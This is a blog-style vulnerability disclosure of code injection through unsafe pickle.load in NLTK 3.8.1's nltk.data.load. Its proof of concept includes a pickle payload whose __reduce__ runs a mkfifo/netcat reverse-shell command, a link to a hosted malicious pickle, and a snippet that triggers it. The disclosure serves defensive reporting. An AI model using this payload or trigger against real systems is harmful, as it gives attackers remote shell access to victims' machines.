---
layout: post
title:  "Command injection via unsafe pickle.loads in nltk.data.load in NLTK"
date:  2024-06-28 10:31:06 +0800
categories: command-injection
---

## Name

> Command injection via unsafe pickle.loads in nltk.data.load

## Weakness

> CWE-94: Code Injection

## Severity

> High (8.8)

## Version

> 3.8.1

## Description

The NLTK api [`nltk.data.load`](https://www.nltk.org/api/nltk.data.html?highlight=load#nltk.data.load) is used to load a given resource from the NLTK data package, and it supports load pickle packages from remote sources. However, after the pickle file is downloaded, it uses `pickle.load` method to load the file which causing a malicious pickle file executing arbitrary code on victim's mechine.

The vulnerable function: [`nltk.data.load`](https://github.com/nltk/nltk/blob/8c233dc585b91c7a0c58f96a9d99244a379740d5/nltk/data.py#L754)

```
def load(
    resource_url,
    format="auto",
    cache=True,
    verbose=False,
    logic_parser=None,
    fstruct_reader=None,
    encoding=None,
):
    
    resource_url = normalize_resource_url(resource_url)
    resource_url = add_py3_data(resource_url)

    ...
    # Load the resource.
    opened_resource = _open(resource_url)

    if format == "raw":
        resource_val = opened_resource.read()
    elif format == "pickle":
        # vulnerable to code execution attacks !!!!!
        resource_val = pickle.load(opened_resource)
    elif format == "json":
    ...
```

## Proof of Concept

Firstly, create a malicious pickle file and upload to github.

### `payload.pickle`

Use following snippets to create a malicous pickle payload:

```
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

with open('payload.py.debug_pkl', 'wb') as f:
    pickle.dump(RCE(), f)
```

I have uploaded the [`payload.pickle`](https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle) to github for testing.


## Start attack

Install latest NLTK:

```
pip install nltk
```

Use following snippets to trigger the unsafe `pickle.loads` command injection:

```
from nltk.data import load
load("https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle")
```

After the command executed, we can check the `/tmp/f` file is created.

```
> ls -la /tmp/f
prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
```
## Colab

Tested on google colab: [https://colab.research.google.com/drive/160HoB0-PdFqOzBoUch7hj3n9olm2sfS1?usp=sharing](https://colab.research.google.com/drive/160HoB0-PdFqOzBoUch7hj3n9olm2sfS1?usp=sharing)

![image](http://live.staticflickr.com/65535/53820920049_03d7b6ff6e_h.jpg)

## Impact

This vulnerability can have severe consequences. If victims load a malicious pickle file from remote sources using `nltk.data.load`, command injection can be achieved.


## Occurrences

[nltk.data.load#L754](https://github.com/nltk/nltk/blob/8c233dc585b91c7a0c58f96a9d99244a379740d5/nltk/data.py#L754)

